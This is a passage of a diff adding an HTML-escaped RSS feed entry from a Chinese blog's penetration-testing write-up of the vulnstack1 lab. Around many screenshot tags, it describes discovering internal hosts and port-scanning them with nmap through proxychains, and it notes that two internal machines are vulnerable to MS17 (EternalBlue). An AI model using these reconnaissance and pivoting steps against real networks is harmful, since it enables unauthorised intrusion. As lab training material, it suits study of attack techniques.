+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721115966757-548349de-0e79-4d7d-aff9-3dbea4dc97fc_hu8c03bcba2878055701f5b8f21efaea56_52492_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721115966757-548349de-0e79-4d7d-aff9-3dbea4dc97fc_hu8c03bcba2878055701f5b8f21efaea56_52492_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;344&#34;
+		data-flex-basis=&#34;827px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;138和141刚好就是另外两台内网ip&lt;/p&gt;
+&lt;p&gt;或者port scan有arp扫描主机&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721116091308-d7badcee-3ac7-4934-94c2-fa86179cb34a.png&#34;
+	width=&#34;985&#34;
+	height=&#34;465&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721116091308-d7badcee-3ac7-4934-94c2-fa86179cb34a_hu057929c52539af832bf1c169f307e44f_143958_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721116091308-d7badcee-3ac7-4934-94c2-fa86179cb34a_hu057929c52539af832bf1c169f307e44f_143958_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;211&#34;
+		data-flex-basis=&#34;508px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;选择内网的网段&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721116531548-29dc7cc0-b699-4854-9f3b-f3cafb8242d0.png&#34;
+	width=&#34;526&#34;
+	height=&#34;119&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721116531548-29dc7cc0-b699-4854-9f3b-f3cafb8242d0_hua17538cab7317a211213efeb2a450639_23613_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721116531548-29dc7cc0-b699-4854-9f3b-f3cafb8242d0_hua17538cab7317a211213efeb2a450639_23613_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;442&#34;
+		data-flex-basis=&#34;1060px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721116615008-a6420a47-31a7-4344-8dd4-37fba0a5e410.png&#34;
+	width=&#34;687&#34;
+	height=&#34;112&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721116615008-a6420a47-31a7-4344-8dd4-37fba0a5e410_hue19a7b219a3b2fdc8e673cc0f689dc09_41296_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721116615008-a6420a47-31a7-4344-8dd4-37fba0a5e410_hue19a7b219a3b2fdc8e673cc0f689dc09_41296_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;613&#34;
+		data-flex-basis=&#34;1472px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;三台主机的内网ip都出来了&lt;/p&gt;
+&lt;h4 id=&#34;扫端口&#34;&gt;扫端口
+&lt;/h4&gt;&lt;h5 id=&#34;cs-1&#34;&gt;cs
+&lt;/h5&gt;&lt;p&gt;&lt;code&gt;nmap -sC -sV -p 1-1000 ip&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721119739795-e62099e8-3ddc-4217-b7bd-7cdca77e9f3b.png&#34;
+	width=&#34;643&#34;
+	height=&#34;314&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721119739795-e62099e8-3ddc-4217-b7bd-7cdca77e9f3b_hu1a01a7a18714023b5d128e80a9fed27a_116839_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721119739795-e62099e8-3ddc-4217-b7bd-7cdca77e9f3b_hu1a01a7a18714023b5d128e80a9fed27a_116839_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;204&#34;
+		data-flex-basis=&#34;491px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h5 id=&#34;nmap&#34;&gt;nmap
+&lt;/h5&gt;&lt;p&gt;注意:这里用&lt;code&gt;proxychains&lt;/code&gt;用proxychains4没用&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721121882248-491eba34-4d0e-4616-9915-ffe93baff598.png&#34;
+	width=&#34;959&#34;
+	height=&#34;251&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721121882248-491eba34-4d0e-4616-9915-ffe93baff598_hu3ceeabba79dbe63d1682b24e4ab5be84_234763_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721121882248-491eba34-4d0e-4616-9915-ffe93baff598_hu3ceeabba79dbe63d1682b24e4ab5be84_234763_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;382&#34;
+		data-flex-basis=&#34;916px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;后面两个就内网的机子都是有ms17的漏洞&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
